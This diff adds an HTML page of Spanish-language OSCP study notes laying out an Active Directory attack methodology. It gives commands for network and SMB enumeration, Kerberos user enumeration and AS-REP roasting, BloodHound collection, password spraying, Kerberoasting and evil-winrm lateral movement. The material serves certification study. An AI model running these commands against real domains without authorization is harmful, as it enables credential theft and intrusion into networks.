@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>AD Lateral Movement & Persistence - AD Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+        <a href="windows_privesc.html">Windows PrivEsc</a>
+        <a href="linux-privesc.html">Linux Privesc</a>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+    </nav>
+
+    <div class="container">
+
+        <div class="container">
+
+
+            <h1>Metodología de Active Directory para OSCP</h1>
+            <p>
+                Esta metodología sigue el enfoque esperado en el examen <strong>OSCP</strong>: enumeración profunda,
+                abuso de configuraciones incorrectas y escalada progresiva de privilegios.
+            </p>
+
+
+            <div class="section">
+                <h2>1. Enumeración inicial (sin credenciales)</h2>
+                <p><strong>Objetivo:</strong> Identificar el dominio, el Domain Controller y los servicios expuestos.
+                </p>
+
+
+                <h3>Escaneo de red</h3>
+                <pre><code>nmap -p- -sS -T4 &lt;IP&gt;
+nmap -sC -sV -p &lt;puertos&gt; &lt;IP&gt;</code></pre>
+
+
+                <ul>
+                    <li>Kerberos (88)</li>
+                    <li>LDAP (389 / 636)</li>
+                    <li>SMB (445)</li>
+                    <li>DNS (53)</li>
+                </ul>
+
+
+                <h3>SMB</h3>
+                <pre><code>smbclient -L //&lt;IP&gt; -N
+smbmap -H &lt;IP&gt;
+enum4linux -a &lt;IP&gt;</code></pre>
+
+
+                <h3>Kerberos</h3>
+                <pre><code>kerbrute userenum -d dominio.local users.txt --dc &lt;IP&gt;
+GetNPUsers.py dominio.local/ -no-pass -usersfile users.txt</code></pre>
+            </div>
+
+
+            <div class="section">
+                <h2>2. Enumeración con credenciales válidas</h2>
+                <p><strong>Objetivo:</strong> Mapear completamente el dominio.</p>
+
+
+                <h3>Validar credenciales</h3>
+                <pre><code>crackmapexec smb &lt;IP&gt; -u user -p pass</code></pre>
+
+
+                <h3>Enumeración AD</h3>
+                <pre><code>crackmapexec smb &lt;IP&gt; -u user -p pass --users
+crackmapexec smb &lt;IP&gt; -u user -p pass --groups
+crackmapexec smb &lt;IP&gt; -u user -p pass --shares</code></pre>
+
+
+                <h3>BloodHound</h3>
+                <pre><code>bloodhound-python -u user -p pass -d dominio.local -ns &lt;IP&gt; -c all</code></pre>
+
+
+                <div class="note">
+                    <strong>Clave OSCP:</strong> Buscar caminos a <em>Domain Admin</em>, ACLs abusables y relaciones de
+                    privilegio indirectas.
+                </div>
+            </div>
+
+
+            <div class="section">
+                <h2>3. Ataques comunes a Active Directory</h2>
+
+
+                <h3>Password Spraying</h3>
+                <pre><code>kerbrute passwordspray -d dominio.local users.txt 'Password123'</code></pre>
+
+
+                <h3>Kerberoasting</h3>
+                <pre><code>GetUserSPNs.py dominio.local/user:pass -request</code></pre>
+
+
+                <h3>Permisos peligrosos</h3>
+                <ul>
+                    <li>GenericAll</li>
+                    <li>WriteDACL</li>
+                    <li>WriteOwner</li>
+                    <li>GPOs mal configuradas</li>
+                </ul>
+            </div>
+
+
+            <div class="section">
+                <h2>4. Movimiento lateral</h2>
+
+
+                <pre><code>evil-winrm -i &lt;IP&gt; -u user -p pass
+crackmapexec smb &lt;IP&gt; -u user -p pass</code></pre>
+
+
+            </div>
+        </div>
+
+
+
+        <script>
+            document.querySelectorAll(".section-header").forEach(h => {
+                h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+            })
+        </script>
+
+</body>
+
+</html>
